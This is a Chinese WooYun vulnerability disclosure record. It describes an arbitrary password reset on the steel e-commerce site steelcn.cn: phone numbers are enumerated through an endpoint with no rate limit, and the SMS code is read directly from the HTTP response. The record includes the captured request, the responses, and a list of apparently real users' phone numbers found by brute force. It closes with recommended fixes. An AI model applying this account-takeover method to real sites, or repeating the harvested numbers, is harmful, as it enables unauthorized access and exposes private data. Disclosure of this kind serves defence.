{"id": 36414, "wybug_id": "wooyun-2015-0107214", "wybug_title": "某钢材电商平台任意帐号密码重置", "wybug_corp": "steelcn.cn", "wybug_author": "江湖", "wybug_date": "2015-04-13 11:10", "wybug_open_date": "2015-05-28 11:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某钢材电商平台任意帐号密码重置 详细说明：  找回密码页面http://i.steelcn.cn/passport/password.aspx开始抓包，在手机号档输入手机号，点击“点击获取六位验证码”。如手机号没有注册，响应内容为2。请求包：\nGET /passport/password.aspx?action=ajax&userid=&mobile=13007500223&t=142812345678 HTTP/1.1Host: i.steelcn.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: http://i.steelcn.cn/passport/password.aspxCookie: ASP.NET_SessionId=azeaysnopyqvoq2nlpp3pg3mConnection: keep-alive\n响应包：\nHTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Vary: Accept-EncodingServer: Microsoft-IIS/7.5X-AspNet-Version: 2.0.50727X-Powered-By: ASP.NETDate: Fri, 10 Apr 2015 15:15:14 GMTContent-Length: 62\n经测试，程序并没有限制对请求IP做单位时间请求的限制，可以进行爆破。用工具生成了一个手机号字典。跑了一会时间，得到几个已注册的手机号。\n130075002231300750062313007502047130075126601300751346413007516004130075218991300753973913007547919130076005781300760185713007605518130076056171300761035513007616780\n并且，在已注册的手机号请求包的响应包中，直接可以看到验证码。\nHTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Vary: Accept-EncodingServer: Microsoft-IIS/7.5X-AspNet-Version: 2.0.50727X-Powered-By: ASP.NETDate: Fri, 10 Apr 2015 15:15:14 GMTContent-Length: 6480599\n重新用爆出的手机号发请求，抓包，然后用响应中的验证码登录。成功进入。\n\n   漏洞证明：  \n\n   修复方案：  1.应限制单位时间同一IP尝试注册手机号的请求。2.响应不应该包含了验证码内容。修复方案，参考参考http://drops.wooyun.org/papers/2035   版权声明：转载请注明来源 江湖@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2015-05-28 13:38 |    \t\tllkoio \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 热爱网络安全！)\t\t \n  为啥响应包要包含验证码呢？不是应该发给手机吗？怎么还要返给浏览器呢？    \n     2015-05-28 22:29 |    \t\t江湖 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:6        | 一入江湖岁月催！)\t\t \n  所以很奇葩呀，很多这一类的找回密码漏洞的。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}